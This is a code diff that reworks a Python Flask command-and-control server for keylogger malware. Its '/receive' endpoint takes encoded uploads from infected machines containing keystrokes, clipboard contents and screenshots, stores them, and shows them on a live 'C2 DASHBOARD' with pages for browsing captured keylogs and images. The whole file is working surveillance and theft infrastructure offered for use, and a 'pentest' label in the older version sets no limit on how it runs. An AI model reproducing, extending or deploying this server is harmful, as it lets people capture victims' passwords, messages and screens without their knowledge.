@@ -1,251 +1,189 @@
-#!/usr/bin/env python3
 from flask import Flask, request, jsonify, send_from_directory, Response
-from flask_cors import CORS
-import os, json, base64, zlib
-from datetime import datetime
-from pathlib import Path
-import glob
+import base64
+import zlib
+import json
+import os
+import datetime
 
 app = Flask(__name__)
-CORS(app, origins="*")
 
-# Ensure data directories exist
-DATA_DIR = Path("./data")
-for subdir in ["logs", "screenshots"]:
-    (DATA_DIR / subdir).mkdir(parents=True, exist_ok=True)
+BASE_DIR = "c2_data"
+for folder in ["logs", "keys", "screenshots"]:
+    os.makedirs(f"{BASE_DIR}/{folder}", exist_ok=True)
 
-print(f"📁 Data directory: {DATA_DIR.absolute()}")
+def decrypt_payload(data_b64):
+    """Decode agent payload"""
+    try:
+        data_bytes = base64.b64decode(data_b64)
+        decompressed = zlib.decompress(data_bytes).decode('utf-8')
+        return json.loads(decompressed)
+    except Exception as e:
+        print(f"❌ Decrypt failed: {e}")
+        return None
 
 @app.route("/receive", methods=["POST"])
 def receive():
-    """Receive keylogger data"""
     try:
-        data = request.get_json()
-        if not data or "data" not in data:
-            return jsonify({"error": "No data"}), 400
+        if not request.is_json:
+            return jsonify({"error": "JSON required"}), 400
             
-        session = data.get("session", "unknown")
-        compressed_data = base64.b64decode(data["data"])
-        payload = json.loads(zlib.decompress(compressed_data).decode('utf-8'))
+        payload_encrypted = request.json.get("data")
+        if not payload_encrypted:
+            return jsonify({"error": "No data field"}), 400
         
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        payload = decrypt_payload(payload_encrypted)
+        if not payload:
+            return jsonify({"error": "Payload decode failed"}), 400
+        
+        session_id = payload.get("session_id", payload.get("hostname", "unknown"))
+        keys = payload.get("keys", "")
+        shots = payload.get("screenshot_data", [])
+        clipboard = payload.get("clipboard", "")
+        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
         
         # Save JSON log
-        log_file = DATA_DIR / "logs" / f"{session}_{ts}.json"
+        log_file = f"{BASE_DIR}/logs/{session_id}_{ts}.json"
         with open(log_file, "w") as f:
             json.dump(payload, f, indent=2)
         
-        # Save screenshots (FIXED)
-        screenshot_count = 0
-        for i, shot in enumerate(payload.get("screenshots", [])):
+        # Save keys
+        if keys and keys != ".":
+            keys_file = f"{BASE_DIR}/keys/{session_id}_{ts}.txt"
+            with open(keys_file, "w", encoding="utf-8") as f:
+                f.write(keys)
+        
+        # Save screenshots
+        saved_shots = 0
+        for shot in shots:
             try:
+                shot_file = f"{BASE_DIR}/screenshots/{shot['filename']}"
                 img_data = base64.b64decode(shot["data"])
-                img_file = DATA_DIR / "screenshots" / f"{session}_{i}_{ts}.jpg"
-                with open(img_file, "wb") as f:
+                with open(shot_file, "wb") as f:
                     f.write(img_data)
-                screenshot_count += 1
+                saved_shots += 1
             except Exception as e:
-                print(f"Screenshot save error: {e}")
-                continue
+                print(f"❌ Shot save error: {e}")
         
-        print(f"📥 [{session}] {len(payload.get('keys', []))} keys, {screenshot_count} screenshots")
+        print(f"✅ [{session_id}] {len(keys)}ch keys, {saved_shots} shots")
         
+        # EXACT client-expected format
         return jsonify({
-            "status": "ok", 
-            "session": session, 
-            "keys": len(payload.get('keys', [])),
-            "screenshots": screenshot_count
-        })
+            "keys_len": len(keys) if keys else 0,
+            "shots": saved_shots,
+            "status": "ok"
+        }), 200
         
     except Exception as e:
-        print(f"❌ Receive error: {e}")
+        print(f"❌ SERVER ERROR: {e}")
         return jsonify({"error": str(e)}), 500
 
 @app.route("/")
-@app.route("/dashboard")
 def dashboard():
-    """Live dashboard with all sessions"""
-    sessions = []
-    
-    # Get all log files
-    for log_file in sorted(DATA_DIR.glob("logs/*.json"), key=os.path.getmtime, reverse=True):
-        try:
-            with open(log_file) as f:
-                data = json.load(f)
-            session_id = log_file.stem.split("_")[0]
-            sessions.append({
-                "id": session_id,
-                "keys": len(data.get("keys", [])),
-                "screenshots": len(data.get("screenshots", [])),
-                "hostname": data.get("system", {}).get("hostname", "unknown"),
-                "time": datetime.fromtimestamp(log_file.stat().st_mtime).strftime("%H:%M:%S"),
-                "keys_preview": json.dumps(data.get("keys", [])[-5:], indent=2)[:300]
-            })
-        except:
-            continue
-    
-    html = f"""
+    try:
+        shots = sorted([f for f in os.listdir(f"{BASE_DIR}/screenshots") if f.endswith('.png')], reverse=True)[:12]
+        keylogs = sorted([f for f in os.listdir(f"{BASE_DIR}/keys") if f.endswith('.txt')], reverse=True)[:10]
+        
+        shots_html = ''.join([
+            f'<div class="shot"><a href="/shots/{shot}" target="_blank">'
+            f'<img src="/shots/{shot}" alt="{shot}" loading="lazy"></a>'
+            f'<div>{shot}</div></div>'
+            for shot in shots
+        ])
+        
+        keys_html = ''.join([
+            f'<div class="keylog"><a href="/keys/{key}" target="_blank">{key}</a></div>'
+            for key in keylogs
+        ])
+        
+        html = f"""
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 PENTEST C2 DASHBOARD</title>
-    <meta http-equiv="refresh" content="10">
+    <title>🔥 C2 DASHBOARD</title>
+    <meta name="viewport" content="width=device-width">
     <style>
-        * {{ margin:0; padding:0; box-sizing:border-box; }}
-        body {{ 
-            background: #000; 
-            color: #00ff00; 
-            font-family: 'Courier New', monospace; 
-            padding: 20px; 
-            line-height: 1.4;
-        }}
-        .header {{ 
-            text-align: center; 
-            margin-bottom: 30px; 
-            font-size: 24px; 
-        }}
-        .stats {{ 
-            background: #111; 
-            padding: 10px; 
-            margin-bottom: 20px; 
-            border-left: 4px solid #00ff00;
-        }}
-        .session {{ 
-            background: #0a0a0a; 
-            margin: 15px 0; 
-            padding: 20px; 
-            border: 1px solid #333; 
-            border-radius: 5px;
-        }}
-        .session h3 {{ 
-            color: #00ff00; 
-            margin-bottom: 10px; 
-            font-size: 18px;
-        }}
-        .keys-preview {{ 
-            background: #000; 
-            padding: 10px; 
-            font-size: 12px; 
-            max-height: 100px; 
-            overflow-y: auto;
-            border: 1px solid #333;
-        }}
-        .btn {{ 
-            background: #00ff00; 
-            color: #000; 
-            padding: 8px 15px; 
-            text-decoration: none; 
-            border-radius: 3px; 
-            font-size: 12px;
-            margin-right: 10px;
-        }}
-        .screenshots-grid {{
-            display: flex; flex-wrap: wrap; margin-top: 10px;
-        }}
-        .screenshots-grid img {{
-            width: 200px; height: 150px; 
-            object-fit: cover; 
-            margin: 5px; 
-            border: 2px solid #333;
-            cursor: pointer;
-        }}
+        *{{margin:0;padding:0;box-sizing:border-box}}
+        body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:20px;line-height:1.4}}
+        .header{{text-align:center;margin-bottom:30px}}
+        h1{{color:#0f0;font-size:3em;text-shadow:0 0 20px #0f0}}
+        .stats{{display:flex;justify-content:center;gap:40px;margin-bottom:30px;font-size:1.2em}}
+        .shots-grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px;margin-bottom:30px}}
+        .shot{{background:#111;padding:15px;border-radius:10px;border:2px solid #333;transition:transform 0.3s}}
+        .shot:hover{{transform:scale(1.05);border-color:#0f0;box-shadow:0 0 20px #0f0}}
+        .shot img{{width:100%;height:180px;object-fit:cover;border-radius:5px}}
+        .shot div{{margin-top:10px;font-size:0.9em;overflow:hidden;text-overflow:ellipsis}}
+        .keylogs{{background:#111;padding:25px;border-radius:10px;border-left:5px solid #0f0;max-height:400px;overflow-y:auto}}
+        .keylog{{padding:12px;margin:8px 0;background:#000;border-radius:5px;cursor:pointer;transition:background 0.2s}}
+        .keylog:hover{{background:#0a0a0a}}
+        .keylog a{{color:#0f0;text-decoration:none}}
+        .live{{animation:pulse 2s infinite}}
+        @keyframes pulse{{0%,100%{{opacity:1}}50%{{opacity:0.5}}}}
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>🚀 LIVE PENTEST C2</h1>
+        <h1>🔥 C2 DASHBOARD</h1>
         <div class="stats">
-            Active Sessions: <strong>{len(sessions)}</strong> | 
-            Total Logs: <strong>{len(list(DATA_DIR.glob("logs/*.json")))}</strong> | 
-            Total Screenshots: <strong>{len(list(DATA_DIR.glob("screenshots/*.jpg")))}</strong>
+            <div>📸 <span id="shotcount">{len(shots)}</span> Shots</div>
+            <div>⌨️ <span id="keycount">{len(keylogs)}</span> Logs</div>
+            <div class="live">🟢 LIVE</div>
         </div>
     </div>
-"""
     
-    for session in sessions[:10]:  # Show latest 10
-        screenshots = len(glob.glob(f"data/screenshots/{session['id']}*.jpg"))
-        html += f"""
-        <div class="session">
-            <h3>🖥️ {session['hostname']} | {session['id']} 
-                <span style="font-size:14px;color:#888">
-                    ({session['time']}) 
-                    • {session['keys']} keys 
-                    • {screenshots} screenshots
-                </span>
-            </h3>
-            <div class="keys-preview">{session['keys_preview']}...</div>
-            <a href="/screenshots/{session['id']}" class="btn">📸 Screenshots</a>
-            <a href="/logs/{session['id']}_latest.json" class="btn">📄 Full Log</a>
-        </div>
-        """
+    <div class="shots-grid">
+        {shots_html}
+    </div>
     
-    html += """
+    <div class="keylogs">
+        <h2 style="margin-bottom:20px;font-size:1.5em">⌨️ Latest Keylogs</h2>
+        {keys_html}
+    </div>
+    
     <script>
-        // Auto-scroll to bottom
-        window.scrollTo(0, document.body.scrollHeight);
+        setTimeout(()=>location.reload(), 30000);
     </script>
 </body>
-</html>"""
-    
-    return html
+</html>
+        """
+        return html
+        
+    except Exception as e:
+        return f"<pre style='color:#f00'>Dashboard Error: {e}</pre>", 500
 
-@app.route("/screenshots/<session>")
-def screenshots(session):
-    """Screenshot gallery for session"""
-    img_files = []
-    for img_file in DATA_DIR.glob(f"screenshots/{session}*.jpg"):
-        img_files.append(str(img_file.relative_to(DATA_DIR)))
-    
-    html = f"""
+@app.route("/shots/<path:filename>")
+def serve_shot(filename):
+    try:
+        return send_from_directory(f"{BASE_DIR}/screenshots", filename)
+    except:
+        return "File not found", 404
+
+@app.route("/keys/<path:filename>")
+def serve_key(filename):
+    try:
+        filepath = f"{BASE_DIR}/keys/{filename}"
+        if os.path.exists(filepath):
+            with open(filepath, "r", encoding="utf-8") as f:
+                content = f.read()
+            content = content.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
+            content = content.replace('\n', '<br>').replace(' ', '&nbsp;')
+            
+            return f"""
 <!DOCTYPE html>
-<html><head><title>📸 Screenshots - {session}</title>
-<style>
-body{{background:black;color:lime;font-family:monospace;padding:30px}}
-.grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:15px}}
-img{{width:100%;height:200px;object-fit:cover;border:2px solid lime;border-radius:8px;cursor:pointer;transition:transform 0.2s}}
-img:hover{{transform:scale(1.05);border-color:#00ff88}}
-a{{color:lime;text-decoration:none;font-size:18px;margin-bottom:20px;display:block}}</style>
+<html><head><title>Keylog: {filename}</title>
+<style>body{{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:40px;font-size:16px;line-height:1.6}}
+pre{{background:#111;padding:30px;border-radius:15px;border:2px solid #333;max-height:85vh;overflow:auto;white-space:pre-wrap}}</style>
 </head>
 <body>
-<a href="/">← Dashboard</a>
-<h1>📸 {session} ({len(img_files)} screenshots)</h1>
-<div class="grid">
-"""
-    
-    for img_path in sorted(img_files, reverse=True):
-        html += f'<img src="/{img_path}" onclick="window.open(this.src)">'
-    
-    html += "</div></body></html>"
-    return html
-
-@app.route("/logs/<path:filename>")
-def serve_log(filename):
-    """Serve log files"""
-    log_path = DATA_DIR / "logs" / filename
-    if log_path.exists():
-        return send_from_directory(DATA_DIR / "logs", filename)
-    return "File not found", 404
-
-@app.route("/<path:filename>")
-def serve_static(filename):
-    """Serve screenshots and other files"""
-    file_path = DATA_DIR / filename
-    if file_path.exists():
-        return send_from_directory(DATA_DIR, filename)
-    return "File not found", 404
-
-@app.route("/status")
-def status():
-    """API status"""
-    return jsonify({
-        "status": "alive",
-        "logs": len(list(DATA_DIR.glob("logs/*.json"))),
-        "screenshots": len(list(DATA_DIR.glob("screenshots/*.jpg")))
-    })
+<h1 style="color:#0f0;margin-bottom:30px">{filename}</h1>
+<pre>{content}</pre>
+<a href="/" style="position:fixed;top:20px;left:20px;color:#0f0;font-size:20px;text-decoration:none">🏠 Dashboard</a>
+</body></html>
+            """
+        return "File not found", 404
+    except:
+        return "Error", 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
-    print(f"🚀 C2 Server running on :{port}")
-    print(f"📁 Logs: {DATA_DIR / 'logs'}")
-    print(f"📸 Screenshots: {DATA_DIR / 'screenshots'}")
-    app.run(host="0.0.0.0", port=port, debug=False)
+    print(f"🚀 C2 Server LIVE on :{port}")
+    app.run(host="0.0.0.0", port=port, debug=False, threaded=True)
